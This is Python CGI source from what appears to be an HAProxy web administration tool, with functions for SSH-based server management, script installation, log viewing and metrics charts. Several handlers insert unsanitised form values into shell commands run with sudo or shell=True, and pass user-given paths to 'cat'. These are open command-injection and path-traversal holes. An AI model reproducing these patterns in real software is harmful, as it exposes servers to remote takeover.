		config = ConfigParser(interpolation=ExtendedInterpolation())
		config.read(path_config)
	except:
		print('Content-type: text/html\n')
		print('<center><div class=""alert alert-danger"">Check the config file, whether it exists and the path. Must be: app/haproxy-webintarface.config</div>')
	try:
		return config.get(sec, var)
	except:
		print('Content-type: text/html\n')
		print('<center><div class=""alert alert-danger"">Check the config file. Presence section %s and parameter %s</div>' % (sec, var))
					
def get_data(type):
	from datetime import datetime
	from pytz import timezone
	import sql
	now_utc = datetime.now(timezone(sql.get_setting('time_zone')))
	if type == 'config':
		fmt = ""%Y-%m-%d.%H:%M:%S""
	if type == 'logs':
		fmt = '%Y%m%d'
	if type == ""date_in_log"":
		fmt = ""%b %d %H:%M:%S""
		
	return now_utc.strftime(fmt)
			
def logging(serv, action, **kwargs):
	import sql
	import http.cookies
	log_path = get_config_var('main', 'log_path')
	login = ''
	
	if not os.path.exists(log_path):
		os.makedirs(log_path)
		
	try:
		IP = cgi.escape(os.environ[""REMOTE_ADDR""])
		cookie = http.cookies.SimpleCookie(os.environ.get(""HTTP_COOKIE""))
		user_uuid = cookie.get('uuid')
		login = sql.get_user_name_by_uuid(user_uuid.value)
	except:
		pass
		
	if kwargs.get('alerting') == 1:
		mess = get_data('date_in_log') + action + ""\n""
		log = open(log_path + ""/checker-""+get_data('logs')+"".log"", ""a"")
	elif kwargs.get('metrics') == 1:
		mess = get_data('date_in_log') + action + ""\n""
		log = open(log_path + ""/metrics-""+get_data('logs')+"".log"", ""a"")
	elif kwargs.get('keep_alive') == 1:
		mess = get_data('date_in_log') + action + ""\n""
		log = open(log_path + ""/keep_alive-""+get_data('logs')+"".log"", ""a"")
	else:
		mess = get_data('date_in_log') + "" from "" + IP + "" user: "" + login + "" "" + action + "" for: "" + serv + ""\n""
		log = open(log_path + ""/config_edit-""+get_data('logs')+"".log"", ""a"")
	try:	
		log.write(mess)
		log.close
	except IOError as e:
		print('<center><div class=""alert alert-danger"">Can\'t write log. Please check log_path in config %e</div></center>' % e)
		pass
	
def telegram_send_mess(mess, **kwargs):
	import telebot
	from telebot import apihelper
	import sql
	
	telegrams = sql.get_telegram_by_ip(kwargs.get('ip'))
	proxy = sql.get_setting('proxy')
	
	for telegram in telegrams:
		token_bot = telegram[1]
		channel_name = telegram[2]
			
	if proxy is not None:
		apihelper.proxy = {'https': proxy}
	try:
		bot = telebot.TeleBot(token=token_bot)
		bot.send_message(chat_id=channel_name, text=mess)
	except:
		print(""Fatal: Can't send message. Add Telegram chanel before use alerting at this servers group"")
		sys.exit()
	
def check_login(**kwargs):
	import sql
	import http.cookies
	cookie = http.cookies.SimpleCookie(os.environ.get(""HTTP_COOKIE""))
	user_uuid = cookie.get('uuid')
	ref = os.environ.get(""SCRIPT_NAME"")

	sql.delete_old_uuid()
	
	if user_uuid is not None:
		sql.update_last_act_user(user_uuid.value)
		if sql.get_user_name_by_uuid(user_uuid.value) is None:
			print('<meta http-equiv=""refresh"" content=""0; url=login.py?ref=%s"">' % ref)
	else:
		print('<meta http-equiv=""refresh"" content=""0; url=login.py?ref=%s"">' % ref)
				
def is_admin(**kwargs):
	import sql
	import http.cookies
	cookie = http.cookies.SimpleCookie(os.environ.get(""HTTP_COOKIE""))
	user_id = cookie.get('uuid')
	try:
		role = sql.get_user_role_by_uuid(user_id.value)
	except:
		role = 3
		pass
	level = kwargs.get(""level"")
		
	if level is None:
		level = 1
		
	try:
		return True if role <= level else False
	except:
		return False
		pass

def page_for_admin(**kwargs):
	give_level = 1
	give_level = kwargs.get(""level"")
		
	if not is_admin(level = give_level):
		print('<center><h3 style=""color: red"">How did you get here?! O_o You do not have need permissions</h>')
		print('<meta http-equiv=""refresh"" content=""5; url=/"">')
		import sys
		sys.exit()
				
def ssh_connect(serv, **kwargs):
	import paramiko
	from paramiko import SSHClient
	import sql
	fullpath = get_config_var('main', 'fullpath')
	ssh_enable = ''
	ssh_port = ''
	ssh_user_name = ''
	ssh_user_password = ''
	
	for sshs in sql.select_ssh(serv=serv):
		ssh_enable = sshs[3]
		ssh_user_name = sshs[4]
		ssh_user_password = sshs[5]
		ssh_key_name = fullpath+'/keys/%s.pem' % sshs[2]

	servers = sql.select_servers(server=serv)
	for server in servers:
		ssh_port = server[10]

	ssh = SSHClient()
	ssh.load_system_host_keys()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		if ssh_enable == 1:
			k = paramiko.RSAKey.from_private_key_file(ssh_key_name)
			ssh.connect(hostname = serv, port =  ssh_port, username = ssh_user_name, pkey = k)
		else:
			ssh.connect(hostname = serv, port =  ssh_port, username = ssh_user_name, password = ssh_user_password)
		return ssh
	except paramiko.AuthenticationException:
		return 'Authentication failed, please verify your credentials'
		pass
	except paramiko.SSHException as sshException:
		return 'Unable to establish SSH connection: %s ' % sshException
		pass
	except paramiko.BadHostKeyException as badHostKeyException:
		return 'Unable to verify server\'s host key: %s ' % badHostKeyException
		pass
	except Exception as e:
		if e == ""No such file or directory"":
			return '%s. Check ssh key' % e
			pass
		elif e == ""Invalid argument"":
			error = 'Check the IP of the server'
			pass
		else:
			error = e	
			pass
		return str(error)

def get_config(serv, cfg, **kwargs):
	import sql

	config_path = ""/etc/keepalived/keepalived.conf"" if kwargs.get(""keepalived"") else sql.get_setting('haproxy_config_path')	
	ssh = ssh_connect(serv)
	try:
		sftp = ssh.open_sftp()
		sftp.get(config_path, cfg)
		sftp.close()
		ssh.close()
	except Exception as e:
		ssh = str(e)
		return ssh
	
def diff_config(oldcfg, cfg):
	log_path = get_config_var('main', 'log_path')
	diff = """"
	date = get_data('date_in_log') 
	cmd=""/bin/diff -ub %s %s"" % (oldcfg, cfg)
	
	output, stderr = subprocess_execute(cmd)
	
	for line in output:
		diff += date + "" "" + line + ""\n""
	try:		
		log = open(log_path + ""/config_edit-""+get_data('logs')+"".log"", ""a"")
		log.write(diff)
		log.close
	except IOError:
		print('<center><div class=""alert alert-danger"">Can\'t read write change to log. %s</div></center>' % stderr)
		pass
		
def install_haproxy(serv, **kwargs):
	import sql
	script = ""install_haproxy.sh""
	tmp_config_path = sql.get_setting('tmp_config_path')
	haproxy_sock_port = sql.get_setting('haproxy_sock_port')
	stats_port = sql.get_setting('stats_port')
	server_state_file = sql.get_setting('server_state_file')
	stats_user = sql.get_setting('stats_user')
	stats_password = sql.get_setting('stats_password')
	proxy = sql.get_setting('proxy')
	os.system(""cp scripts/%s ."" % script)
	
	proxy_serv = proxy if proxy is not None else """"
		
	commands = [ ""sudo chmod +x ""+tmp_config_path+script+"" && "" +tmp_config_path+""/""+script +"" PROXY="" + proxy_serv+ 
				"" SOCK_PORT=""+haproxy_sock_port+"" STAT_PORT=""+stats_port+"" STAT_FILE=""+server_state_file+
				"" STATS_USER=""+stats_user+"" STATS_PASS=""+stats_password ]
	
	error = str(upload(serv, tmp_config_path, script))
	if error:
		print('error: '+error)
		
	os.system(""rm -f %s"" % script)
	ssh_command(serv, commands, print_out=""1"")
	
	if kwargs.get('syn_flood') == ""1"":
		syn_flood_protect(serv)
	
def syn_flood_protect(serv, **kwargs):
	import sql
	script = ""syn_flood_protect.sh""
	tmp_config_path = sql.get_setting('tmp_config_path')
	
	enable = ""disable"" if kwargs.get('enable') == ""0"" else ""disable""

	os.system(""cp scripts/%s ."" % script)
	
	commands = [ ""sudo chmod +x ""+tmp_config_path+script, tmp_config_path+script+ "" ""+enable ]
	
	error = str(upload(serv, tmp_config_path, script))
	if error:
		print('error: '+error)
	os.system(""rm -f %s"" % script)
	ssh_command(serv, commands, print_out=""1"")
	
def waf_install(serv, **kwargs):
	import sql
	script = ""waf.sh""
	tmp_config_path = sql.get_setting('tmp_config_path')
	proxy = sql.get_setting('proxy')
	haproxy_dir = sql.get_setting('haproxy_dir')
	ver = check_haproxy_version(serv)

	os.system(""cp scripts/%s ."" % script)
	
	commands = [ ""sudo chmod +x ""+tmp_config_path+script+"" && "" +tmp_config_path+script +"" PROXY="" + proxy+ 
				"" HAPROXY_PATH=""+haproxy_dir +"" VERSION=""+ver ]
	
	error = str(upload(serv, tmp_config_path, script))
	if error:
		print('error: '+error)
	os.system(""rm -f %s"" % script)
	
	stderr = ssh_command(serv, commands, print_out=""1"")
	if stderr is None:
		sql.insert_waf_metrics_enable(serv, ""0"")

def check_haproxy_version(serv):
	import sql
	haproxy_sock_port = sql.get_setting('haproxy_sock_port')
	ver = """"
	cmd=""echo 'show info' |nc %s %s |grep Version |awk '{print $2}'"" % (serv, haproxy_sock_port)
	output, stderr = subprocess_execute(cmd)
	for line in output:
		ver = line
	return ver
	
def upload(serv, path, file, **kwargs):
	error = """"
	full_path = path + file

	if kwargs.get('dir') == ""fullpath"":
		full_path = path
	
	try:
		ssh = ssh_connect(serv)
	except Exception as e:
		error = e
		pass
	try:
		sftp = ssh.open_sftp()
		file = sftp.put(file, full_path)
		sftp.close()
		ssh.close()
	except Exception as e:
		error = e
		pass
		
	return error
	
def upload_and_restart(serv, cfg, **kwargs):
	import sql
	tmp_file = sql.get_setting('tmp_config_path') + ""/"" + get_data('config') + "".cfg""
	error = """"
	
	try:
		os.system(""dos2unix ""+cfg)
	except OSError:
		return 'Please install dos2unix' 
		pass
	
	if kwargs.get(""keepalived"") == 1:
		if kwargs.get(""just_save"") == ""save"":
			commands = [ ""sudo mv -f "" + tmp_file + "" /etc/keepalived/keepalived.conf"" ]
		else:
			commands = [ ""sudo mv -f "" + tmp_file + "" /etc/keepalived/keepalived.conf && sudo systemctl restart keepalived"" ]
	else:
		if kwargs.get(""just_save"") == ""test"":
			commands = [ ""sudo haproxy  -q -c -f "" + tmp_file + ""&& sudo rm -f "" + tmp_file ]
		elif kwargs.get(""just_save"") == ""save"":
			commands = [ ""sudo haproxy  -q -c -f "" + tmp_file + ""&& sudo mv -f "" + tmp_file + "" "" + sql.get_setting('haproxy_config_path') ]
		else:
			commands = [ ""sudo haproxy  -q -c -f "" + tmp_file + ""&& sudo mv -f "" + tmp_file + "" "" + sql.get_setting('haproxy_config_path') + "" && sudo "" + sql.get_setting('restart_command') ]	
		if sql.get_setting('firewall_enable') == ""1"":
			commands.extend(open_port_firewalld(cfg))
	
	error += str(upload(serv, tmp_file, cfg, dir='fullpath'))

	try:
		error += ssh_command(serv, commands)
	except Exception as e:
		error += e
	if error:
		return error
		
def open_port_firewalld(cfg):
	try:
		conf = open(cfg, ""r"")
	except IOError:
		print('<div class=""alert alert-danger"">Can\'t read export config file</div>')
	
	firewalld_commands = []
	
	for line in conf:
		if ""bind"" in line:
			bind = line.split("":"")
			bind[1] = bind[1].strip(' ')
			bind = bind[1].split(""ssl"")
			bind = bind[0].strip(' \t\n\r')
			firewalld_commands.append('sudo firewall-cmd --zone=public --add-port=%s/tcp --permanent' % bind)
				
	firewalld_commands.append('sudo firewall-cmd --reload')
	return firewalld_commands
	
def check_haproxy_config(serv):
	import sql
	commands = [ ""haproxy  -q -c -f %s"" % sql.get_setting('haproxy_config_path') ]
	ssh = ssh_connect(serv)
	for command in commands:
		stdin , stdout, stderr = ssh.exec_command(command, get_pty=True)
		if not stderr.read():
			return True
		else:
			return False
	ssh.close()
		
def show_log(stdout):
	i = 0
	for line in stdout:
		i = i + 1
		line_class = ""line3"" if i % 2 == 0 else ""line""
		print('<div class=""'+line_class+'"">' + escape_html(line) + '</div>')
			
def show_ip(stdout):
	for line in stdout:
		print(line)
		
def server_status(stdout):	
	proc_count = """"
	
	for line in stdout:
		if ""Ncat: "" not in line:
			for k in line:
				proc_count = k.split("":"")[1]
		else:
			proc_count = 0
	return proc_count		

def ssh_command(serv, commands, **kwargs):
	ssh = ssh_connect(serv)
		  
	for command in commands:
		try:
			stdin, stdout, stderr = ssh.exec_command(command, get_pty=True)
		except:
			continue
				
		if kwargs.get(""ip"") == ""1"":
			show_ip(stdout)
		elif kwargs.get(""show_log"") == ""1"":
			show_log(stdout)
		elif kwargs.get(""server_status"") == ""1"":
			server_status(stdout)
		elif kwargs.get('print_out'):
			print(stdout.read().decode(encoding='UTF-8'))
			return stdout.read().decode(encoding='UTF-8')
		elif kwargs.get('retunr_err') == 1:
			return stderr.read().decode(encoding='UTF-8')
		else:
			return stdout.read().decode(encoding='UTF-8')
			
		for line in stderr.read().decode(encoding='UTF-8'):
			if line:
				print(""<div class='alert alert-warning'>""+line+""</div>"")
	try:	
		ssh.close()
	except:
		print(""<div class='alert alert-danger' style='margin: 0;'>""+str(ssh)+""<a title='Close' id='errorMess'><b>X</b></a></div>"")
		pass

def escape_html(text):
	return cgi.escape(text, quote=True)
	
def subprocess_execute(cmd):
	import subprocess 
	p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, universal_newlines=True)
	stdout, stderr = p.communicate()
	output = stdout.splitlines()
	
	return output, stderr

def show_backends(serv, **kwargs):
	import json
	import sql
	haproxy_sock_port = sql.get_setting('haproxy_sock_port')
	cmd='echo ""show backend"" |nc %s %s' % (serv, haproxy_sock_port)
	output, stderr = subprocess_execute(cmd)
	ret = """"
	for line in output:
		if ""#"" in  line or ""stats"" in line:
			continue
		if line != """":
			back = json.dumps(line).split(""\"""")
			if kwargs.get('ret'):
				ret += back[1]
				ret += ""<br />""
			else:
				print(back[1], end=""<br>"")
		
	if kwargs.get('ret'):
		return ret
		
def get_files(dir = get_config_var('configs', 'haproxy_save_configs_dir'), format = 'cfg', **kwargs):
	import glob
	file = set()
	return_files = set()
	
	for files in glob.glob(os.path.join(dir,'*.'+format)):				
		file.add(files.split('/')[-1])
	files = sorted(file, reverse=True)

	if format == 'cfg':
		for file in files:
			ip = file.split(""-"")
			if serv == ip[0]:
				return_files.add(file)
		return sorted(return_files, reverse=True)
	else: 
		return files
	
def get_key(item):
	return item[0]/n/n/n/app/options.py/n/n#!/usr/bin/env python3
# -*- coding: utf-8 -*-""
import cgi
import os, sys
import funct
import sql
import ovw

form = cgi.FieldStorage()
serv = form.getvalue('serv')
act = form.getvalue('act')
	
print('Content-type: text/html\n')

if act == ""checkrestart"":
	servers = sql.get_dick_permit(ip=serv)
	for server in servers:
		if server != """":
			print(""ok"")
			sys.exit()
	sys.exit()

if form.getvalue('token') is None:
	print(""What the fuck?! U r hacker Oo?!"")
	sys.exit()
		
if form.getvalue('getcerts') is not None and serv is not None:
	cert_path = sql.get_setting('cert_path')
	commands = [ ""ls -1t ""+cert_path+"" |grep pem"" ]
	try:
		funct.ssh_command(serv, commands, ip=""1"")
	except:
		print('<div class=""alert alert-danger"" style=""margin:0"">Can not connect to the server</div>')

if form.getvalue('checkSshConnect') is not None and serv is not None:
	try:
		funct.ssh_command(serv, [""ls -1t""])
	except:
		print('<div class=""alert alert-danger"" style=""margin:0"">Can not connect to the server</div>')
		
if form.getvalue('getcert') is not None and serv is not None:
	id = form.getvalue('getcert')
	cert_path = sql.get_setting('cert_path')
	commands = [ ""cat ""+cert_path+""/""+id ]
	try:
		funct.ssh_command(serv, commands, ip=""1"")
	except:
		print('<div class=""alert alert-danger"" style=""margin:0"">Can not connect to the server</div>')
		
if form.getvalue('ssh_cert'):
	name = form.getvalue('name')
	
	if not os.path.exists(os.getcwd()+'/keys/'):
		os.makedirs(os.getcwd()+'/keys/')
	
	ssh_keys = os.path.dirname(os.getcwd())+'/keys/'+name+'.pem'
	
	try:
		with open(ssh_keys, ""w"") as conf:
			conf.write(form.getvalue('ssh_cert'))
	except IOError:
		print('<div class=""alert alert-danger"">Can\'t save ssh keys file. Check ssh keys path in config</div>')
	else:
		print('<div class=""alert alert-success"">Ssh key was save into: %s </div>' % ssh_keys)
	try:
		funct.logging(""local"", ""users.py#ssh upload new ssh cert %s"" % ssh_keys)
	except:
		pass
			
if serv and form.getvalue('ssl_cert'):
	cert_local_dir = funct.get_config_var('main', 'cert_local_dir')
	cert_path = sql.get_setting('cert_path')
	
	if not os.path.exists(cert_local_dir):
		os.makedirs(cert_local_dir)
	
	if form.getvalue('ssl_name') is None:
		print('<div class=""alert alert-danger"">Please enter desired name</div>')
	else:
		name = form.getvalue('ssl_name') + '.pem'
	
	try:
		with open(name, ""w"") as ssl_cert:
			ssl_cert.write(form.getvalue('ssl_cert'))
	except IOError:
		print('<div class=""alert alert-danger"">Can\'t save ssl keys file. Check ssh keys path in config</div>')
	else:
		print('<div class=""alert alert-success"">SSL file was upload to %s into: %s </div>' % (serv, cert_path))
		
	MASTERS = sql.is_master(serv)
	for master in MASTERS:
		if master[0] != None:
			funct.upload(master[0], cert_path, name)
	try:
		funct.upload(serv, cert_path, name)
	except:
		pass
	
	os.system(""mv %s %s"" % (name, cert_local_dir))
	funct.logging(serv, ""add.py#ssl upload new ssl cert %s"" % name)
	
if form.getvalue('backend') is not None:
	funct.show_backends(serv)
	
if form.getvalue('ip') is not None and serv is not None:
	commands = [ ""sudo ip a |grep inet |egrep -v  '::1' |awk '{ print $2  }' |awk -F'/' '{ print $1  }'"" ]
	funct.ssh_command(serv, commands, ip=""1"")
	
if form.getvalue('showif'):
	commands = [""sudo ip link|grep 'UP' | awk '{print $2}'  |awk -F':' '{print $1}'""]
	funct.ssh_command(serv, commands, ip=""1"")
	
if form.getvalue('action_hap') is not None and serv is not None:
	action = form.getvalue('action_hap')
	
	if funct.check_haproxy_config(serv):
		commands = [ ""sudo systemctl %s haproxy"" % action ]
		funct.ssh_command(serv, commands)		
		print(""HAproxy was %s"" % action)
	else:
		print(""Bad config, check please"")
	
if form.getvalue('action_waf') is not None and serv is not None:
	serv = form.getvalue('serv')
	action = form.getvalue('action_waf')

	commands = [ ""sudo systemctl %s waf"" % action ]
	funct.ssh_command(serv, commands)		
	
if act == ""overview"":
	ovw.get_overview()
	
if act == ""overviewwaf"":
	ovw.get_overviewWaf(form.getvalue('page'))
	
if act == ""overviewServers"":
	ovw.get_overviewServers()
	
if form.getvalue('action'):
	import requests
	from requests_toolbelt.utils import dump
	
	haproxy_user = sql.get_setting('stats_user')
	haproxy_pass = sql.get_setting('stats_password')
	stats_port = sql.get_setting('stats_port')
	stats_page = sql.get_setting('stats_page')
	
	postdata = {
		'action' : form.getvalue('action'),
		's' : form.getvalue('s'),
		'b' : form.getvalue('b')
	}

	headers = {
		'User-Agent' : 'Mozilla/5.0 (Windows NT 5.1; rv:20.0) Gecko/20100101 Firefox/20.0',
		'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
		'Accept-Language' : 'en-US,en;q=0.5',
		'Accept-Encoding' : 'gzip, deflate'
	}

	q = requests.post('http://'+serv+':'+stats_port+'/'+stats_page, headers=headers, data=postdata, auth=(haproxy_user, haproxy_pass))
	
if serv is not None and act == ""stats"":
	import requests
	from requests_toolbelt.utils import dump
	
	haproxy_user = sql.get_setting('stats_user')
	haproxy_pass = sql.get_setting('stats_password')
	stats_port = sql.get_setting('stats_port')
	stats_page = sql.get_setting('stats_page')
	try:
		response = requests.get('http://%s:%s/%s' % (serv, stats_port, stats_page), auth=(haproxy_user, haproxy_pass)) 
	except requests.exceptions.ConnectTimeout:
		print('Oops. Connection timeout occured!')
	except requests.exceptions.ReadTimeout:
		print('Oops. Read timeout occured')
	except requests.exceptions.HTTPError as errh:
		print (""Http Error:"",errh)
	except requests.exceptions.ConnectionError as errc:
		print ('<div class=""alert alert-danger"">Error Connecting: %s</div>' % errc)
	except requests.exceptions.Timeout as errt:
		print (""Timeout Error:"",errt)
	except requests.exceptions.RequestException as err:
		print (""OOps: Something Else"",err)
		
	data = response.content
	print(data.decode('utf-8'))

if serv is not None and form.getvalue('rows') is not None:
	rows = form.getvalue('rows')
	waf = form.getvalue('waf')
	grep = form.getvalue('grep')
	hour = form.getvalue('hour')
	minut = form.getvalue('minut')
	hour1 = form.getvalue('hour1')
	minut1 = form.getvalue('minut1')
	date = hour+':'+minut
	date1 = hour1+':'+minut1
	
	if grep is not None:
        	grep_act  = '|grep'
	else:
		grep_act = ''
		grep = ''

	syslog_server_enable = sql.get_setting('syslog_server_enable')
	if syslog_server_enable is None or syslog_server_enable == ""0"":
		local_path_logs = sql.get_setting('local_path_logs')
		syslog_server = serv	
		commands = [ ""sudo cat %s| awk '$3>\""%s:00\"" && $3<\""%s:00\""' |tail -%s  %s %s"" % (local_path_logs, date, date1, rows, grep_act, grep) ]		
	else:
		commands = [ ""sudo cat /var/log/%s/syslog.log | sed '/ %s:00/,/ %s:00/! d' |tail -%s  %s %s"" % (serv, date, date1, rows, grep_act, grep) ]
		syslog_server = sql.get_setting('syslog_server')
	
	if waf == ""1"":
		local_path_logs = '/var/log/modsec_audit.log'
		commands = [ ""sudo cat %s |tail -%s  %s %s"" % (local_path_logs, rows, grep_act, grep) ]	
		
	funct.ssh_command(syslog_server, commands, show_log=""1"")
	
if serv is not None and form.getvalue('rows1') is not None:
	rows = form.getvalue('rows1')
	grep = form.getvalue('grep')
	hour = form.getvalue('hour')
	minut = form.getvalue('minut')
	hour1 = form.getvalue('hour1')
	minut1 = form.getvalue('minut1')
	date = hour+':'+minut
	date1 = hour1+':'+minut1
	apache_log_path = sql.get_setting('apache_log_path')
	
	if grep is not None:
		grep_act  = '|grep'
	else:
		grep_act = ''
		grep = ''
		
	if serv == 'haproxy-wi.access.log':
		cmd=""cat %s| awk -F\""/|:\"" '$3>\""%s:00\"" && $3<\""%s:00\""' |tail -%s  %s %s"" % (apache_log_path+""/""+serv, date, date1, rows, grep_act, grep)
	else:
		cmd=""cat %s| awk '$4>\""%s:00\"" && $4<\""%s:00\""' |tail -%s  %s %s"" % (apache_log_path+""/""+serv, date, date1, rows, grep_act, grep)

	output, stderr = funct.subprocess_execute(cmd)

	funct.show_log(output)
	print(stderr)
		
if form.getvalue('viewlogs') is not None:
	viewlog = form.getvalue('viewlogs')
	log_path = funct.get_config_var('main', 'log_path')
	rows = form.getvalue('rows2')
	grep = form.getvalue('grep')
	hour = form.getvalue('hour')
	minut = form.getvalue('minut')
	hour1 = form.getvalue('hour1')
	minut1 = form.getvalue('minut1')
	date = hour+':'+minut
	date1 = hour1+':'+minut1
	
	if grep is not None:
		grep_act  = '|grep'
	else:
		grep_act = ''
		grep = ''

	cmd=""cat %s| awk '$3>\""%s:00\"" && $3<\""%s:00\""' |tail -%s  %s %s"" % (log_path + viewlog, date, date1, rows, grep_act, grep)
	output, stderr = funct.subprocess_execute(cmd)

	funct.show_log(output)
	print(stderr)
		
if serv is not None and act == ""showMap"":
	ovw.get_map(serv)
	
if form.getvalue('servaction') is not None:
	server_state_file = sql.get_setting('server_state_file')
	haproxy_sock = sql.get_setting('haproxy_sock')
	enable = form.getvalue('servaction')
	backend = form.getvalue('servbackend')	
	cmd='echo ""%s %s"" |sudo socat stdio %s | cut -d "","" -f 1-2,5-10,18,34-36 | column -s, -t' % (enable, backend, haproxy_sock)
	
	if form.getvalue('save') == ""on"":
		save_command = 'echo ""show servers state"" | sudo socat stdio %s > %s' % (haproxy_sock, server_state_file)
		command = [ cmd, save_command ] 
	else:
		command = [ cmd ] 
		
	if enable != ""show"":
		print('<center><h3>You %s %s on HAproxy %s. <a href=""viewsttats.py?serv=%s"" title=""View stat"" target=""_blank"">Look it</a> or <a href=""edit.py"" title=""Edit"">Edit something else</a></h3><br />' % (enable, backend, serv, serv))
			
	funct.ssh_command(serv, command, show_log=""1"")
	action = 'edit.py ' + enable + ' ' + backend
	funct.logging(serv, action)

if act == ""showCompareConfigs"":
	import glob
	from jinja2 import Environment, FileSystemLoader
	env = Environment(loader=FileSystemLoader('templates/ajax'))
	template = env.get_template('/show_compare_configs.html')
	left = form.getvalue('left')
	right = form.getvalue('right')
	
	template = template.render(serv=serv, right=right, left=left, return_files=funct.get_files())									
	print(template)
	
if serv is not None and form.getvalue('right') is not None:
	from jinja2 import Environment, FileSystemLoader
	left = form.getvalue('left')
	right = form.getvalue('right')
	hap_configs_dir = funct.get_config_var('configs', 'haproxy_save_configs_dir')
	cmd='diff -ub %s%s %s%s' % (hap_configs_dir, left, hap_configs_dir, right)	
	env = Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols', ""jinja2.ext.do""])
	template = env.get_template('compare.html')
	
	output, stderr = funct.subprocess_execute(cmd)
	template = template.render(stdout=output)	
	
	print(template)
	print(stderr)
	
if serv is not None and act == ""configShow"":
	hap_configs_dir = funct.get_config_var('configs', 'haproxy_save_configs_dir')
	
	if form.getvalue('configver') is None:	
		cfg = hap_configs_dir + serv + ""-"" + funct.get_data('config') + "".cfg""
		funct.get_config(serv, cfg)
	else: 
		cfg = hap_configs_dir + form.getvalue('configver')
			
	try:
		conf = open(cfg, ""r"")
	except IOError:
		print('<div class=""alert alert-danger"">Can\'t read import config file</div>')
		
	from jinja2 import Environment, FileSystemLoader
	env = Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols'])
	template = env.get_template('config_show.html')
	
	template = template.render(conf=conf, view=form.getvalue('view'), serv=serv, configver=form.getvalue('configver'), role=funct.is_admin(level=2))											
	print(template)
	
	if form.getvalue('configver') is None:
		os.system(""/bin/rm -f "" + cfg)	
		
if form.getvalue('master'):
	master = form.getvalue('master')
	slave = form.getvalue('slave')
	interface = form.getvalue('interface')
	vrrpip = form.getvalue('vrrpip')
	tmp_config_path = sql.get_setting('tmp_config_path')
	script = ""install_keepalived.sh""
	
	if form.getvalue('hap') == ""1"":
		funct.install_haproxy(master)
		funct.install_haproxy(slave)
		
	if form.getvalue('syn_flood') == ""1"":
		funct.syn_flood_protect(master)
		funct.syn_flood_protect(slave)
	
	os.system(""cp scripts/%s ."" % script)
		
	error = str(funct.upload(master, tmp_config_path, script))
	if error:
		print('error: '+error)
		sys.exit()
	funct.upload(slave, tmp_config_path, script)

	funct.ssh_command(master, [""sudo chmod +x ""+tmp_config_path+script, tmp_config_path+script+"" MASTER ""+interface+"" ""+vrrpip])
	funct.ssh_command(slave, [""sudo chmod +x ""+tmp_config_path+script, tmp_config_path+script+"" BACKUP ""+interface+"" ""+vrrpip])
			
	os.system(""rm -f %s"" % script)
	sql.update_server_master(master, slave)
	
if form.getvalue('masteradd'):
	master = form.getvalue('masteradd')
	slave = form.getvalue('slaveadd')
	interface = form.getvalue('interfaceadd')
	vrrpip = form.getvalue('vrrpipadd')
	kp = form.getvalue('kp')
	tmp_config_path = sql.get_setting('tmp_config_path')
	script = ""add_vrrp.sh""
	
	os.system(""cp scripts/%s ."" % script)
		
	error = str(funct.upload(master, tmp_config_path, script))
	if error:
		print('error: '+error)
		sys.exit()
	funct.upload(slave, tmp_config_path, script)
	
	funct.ssh_command(master, [""sudo chmod +x ""+tmp_config_path+script, tmp_config_path+script+"" MASTER ""+interface+"" ""+vrrpip+"" ""+kp])
	funct.ssh_command(slave, [""sudo chmod +x ""+tmp_config_path+script, tmp_config_path+script+"" BACKUP ""+interface+"" ""+vrrpip+"" ""+kp])
			
	os.system(""rm -f %s"" % script)
	
if form.getvalue('haproxyaddserv'):
	funct.install_haproxy(form.getvalue('haproxyaddserv'), syn_flood=form.getvalue('syn_flood'))
	
if form.getvalue('installwaf'):
	funct.waf_install(form.getvalue('installwaf'))
	
if form.getvalue('metrics_waf'):
	sql.update_waf_metrics_enable(form.getvalue('metrics_waf'), form.getvalue('enable'))
		
if form.getvalue('table_metrics'):
	import http.cookies
	from jinja2 import Environment, FileSystemLoader
	env = Environment(loader=FileSystemLoader('templates/ajax'))
	template = env.get_template('table_metrics.html')
		
	cookie = http.cookies.SimpleCookie(os.environ.get(""HTTP_COOKIE""))
	user_id = cookie.get('uuid')	
	table_stat = sql.select_table_metrics(user_id.value)

	template = template.render(table_stat=sql.select_table_metrics(user_id.value))											
	print(template)
		
if form.getvalue('metrics'):
	from datetime import timedelta
	from bokeh.plotting import figure, output_file, show
	from bokeh.models import ColumnDataSource, HoverTool, DatetimeTickFormatter, DatePicker
	from bokeh.layouts import widgetbox, gridplot
	from bokeh.models.widgets import Button, RadioButtonGroup, Select
	import pandas as pd
	import http.cookies
		
	cookie = http.cookies.SimpleCookie(os.environ.get(""HTTP_COOKIE""))
	user_id = cookie.get('uuid')	
	servers = sql.select_servers_metrics(user_id.value)
	servers = sorted(servers)
	
	p = {}
	for serv in servers:
		serv = serv[0]
		p[serv] = {}
		metric = sql.select_metrics(serv)
		metrics = {}
		
		for i in metric:
			rep_date = str(i[5])
			metrics[rep_date] = {}
			metrics[rep_date]['server'] = str(i[0])
			metrics[rep_date]['curr_con'] = str(i[1])
			metrics[rep_date]['curr_ssl_con'] = str(i[2])
			metrics[rep_date]['sess_rate'] = str(i[3])
			metrics[rep_date]['max_sess_rate'] = str(i[4])

		df = pd.DataFrame.from_dict(metrics, orient=""index"")
		df = df.fillna(0)
		df.index = pd.to_datetime(df.index)
		df.index.name = 'Date'
		df.sort_index(inplace=True)
		source = ColumnDataSource(df)
		
		output_file(""templates/metrics_out.html"", mode='inline')
		
		x_min = df.index.min() - pd.Timedelta(hours=1)
		x_max = df.index.max() + pd.Timedelta(minutes=1)

		p[serv] = figure(
			tools=""pan,box_zoom,reset,xwheel_zoom"",		
			title=metric[0][0],
			x_axis_type=""datetime"", y_axis_label='Connections',
			x_range = (x_max.timestamp()*1000-60*100000, x_max.timestamp()*1000)
			)
			
		hover = HoverTool(
			tooltips=[
				(""Connections"", ""@curr_con""),
				(""SSL connections"", ""@curr_ssl_con""),
				(""Sessions rate"", ""@sess_rate"")
			],
			mode='mouse'
		)
		
		p[serv].ygrid.band_fill_color = ""#f3f8fb""
		p[serv].ygrid.band_fill_alpha = 0.9
		p[serv].y_range.start = 0
		p[serv].y_range.end = int(df['curr_con'].max()) + 150
		p[serv].add_tools(hover)
		p[serv].title.text_font_size = ""20px""						
		p[serv].line(""Date"", ""curr_con"", source=source, alpha=0.5, color='#5cb85c', line_width=2, legend=""Conn"")
